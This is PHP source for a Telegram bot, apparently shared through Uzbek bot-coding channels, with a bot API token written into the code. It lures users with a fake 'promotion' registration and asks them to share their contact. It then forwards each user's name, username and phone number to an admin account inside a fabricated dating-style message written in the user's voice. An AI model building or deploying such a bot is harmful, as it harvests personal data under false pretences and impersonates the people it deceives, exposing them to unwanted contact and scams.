<?php
define('API_KEY','800228543:AAFpE2M6q7jxcSoXHh5CfQbsBpx5LJSHrP8');
$admin = "@netmuz"; // admin idsi
function del($nomi){
array_map('unlink', glob("$nomi"));
}
//kod @Abroriy tomonidan @PHP_OWN va @Bot_Masterlar kanali orqali tarqatildi
function put($fayl,$nima){
file_put_contents("$fayl","$nima");
}
function get($fayl){
$get = file_get_contents("$fayl");
return $get;
}
function ty($ch){ 
return bot('sendChatAction', [
'chat_id' => $ch,
'action' => 'typing',
]);
}
function editMessageText(
        $chatId,
        $messageId,
        $text,
        $parseMode = null,
        $disablePreview = false,
        $replyMarkup = null,
        $inlineMessageId = null
    ) {
       return bot('editMessageText', [
            'chat_id' => $chatId,
            'message_id' => $messageId,
            'text' => $text,
            'inline_message_id' => $inlineMessageId,
            'parse_mode' => $parseMode,
            'disable_web_page_preview' => $disablePreview,
            'reply_markup' => $replyMarkup,
        ]);
    }
function ACL($callbackQueryId, $text = null, $showAlert = false)
{
     return bot('answerCallbackQuery', [
        'callback_query_id' => $callbackQueryId,
        'text' => $text,
        'show_alert'=>$showAlert,
    ]);
}
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
$update = json_decode(get('php://input'));
$message = $update->message;
$text = $message->text;
$cid = $message->chat->id;
$uid = $message->from->id;
$fname = $message->from->first_name;
$user = $message->from->username;
$data = $message->contact;
$nomer = $message->contact->phone_number;
$name = $message->contact->first_name;

if($text == "/royhatdan_otish"){

    bot('sendmessage',[

        'chat_id'=>$cid,
        'text'=>"Рақамингизни юборишни тасдиқланг:",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode(

['resize_keyboard'=>true,
'keyboard' => [
[["text"=>"Тасдиқлаш",'request_contact' =>true],],
]
])
]);
}

if($text == "/start"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"Сиз хам Акцияда иштирок етинг, ройхатдан утинг.\nРойхатдан утиш учун керакли буйруқни танланг:\n[/royhatdan_otish]",
        'parse_mode'=>"markdown",
]);
}
if($data){
bot('sendmessage',[
    'chat_id'=>"$admin",
    'text'=>"Салом, профил номим: [$fname](tg://user?id=$uid) узимга яқин дост излаяпман, хазилкашман, хушчахчах, кайфиятим зур, агарда сиз билан дустлашсак яна хам зур болар эди ☺️ Менга албатта ёзинг, мен хам сизни чин дилдан кутиб қоламан 🤗 \n> Юзерим: [@$user]\n> Рақамим: +$nomer\n\nСервис: [@netmuz]",
    'parse_mode'=>"markdown"
        ]);
bot("sendmessage",[
    'chat_id'=>$cid,
    'text'=>"♻️ @netmuz'га киринг ва кутинг, сиз билан яқин орада боғланамиз... ",
]);
}
//kod @Abroriy tomonidan @PHP_OWN va @Bot_Masterlar kanali orqali 
$button = $message->keyboardbutton->text;